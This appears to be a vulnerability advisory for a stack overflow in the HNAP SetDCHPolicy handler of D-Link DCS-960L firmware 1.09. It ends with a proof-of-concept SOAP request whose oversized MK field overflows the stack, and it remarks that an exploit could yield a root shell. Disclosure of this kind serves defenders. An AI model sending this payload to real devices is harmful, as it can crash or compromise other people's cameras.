# DCS-960L 1.09 Stack overflow

## Product Info

**Supplier**: [Smart Home, SMB and Enterprise solutions | D-Link (dlink.com)](https://www.dlink.com/en)

**Router model**: DCS-960L

**Router Version**: 1.09

**Firmware**: [D-Link Technical Support (dlinktw.com.tw)](https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L)


## Vulnerability introduction

  A stack overflow vulnerability in the SetDCHPolicy function of the HNAP service of D-Link DCS-960L with firmware version 1.09 allows an attacker to execute arbitrary code.



## Vulnerability analysis



In HNAP's SetDCHPolicy function, by constructing MK, the program does not check the length of the MK field, causing a stack overflow.

![image](https://github.com/user-attachments/assets/eec2b9b7-309a-4bd8-a8cd-148e3cef7dd5)

![image](https://github.com/user-attachments/assets/b26de367-7cd4-4f66-ade5-5dfa21a29ff2)


## POC



```xml
SOAPAction: http://192.168.0.1/HNAP1/Login
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SetDCHPolicy xmlns="http://192.168.0.1/HNAP1/">
      <PolicyList>
        <PolicyInfo>
          <MK> a * 160000 </MK>
        </PolicyInfo>
      </PolicyList>
    </SetDCHPolicy>
  </soap:Body>
</soap:Envelope>
```
You can write exp to further obtain the root shell
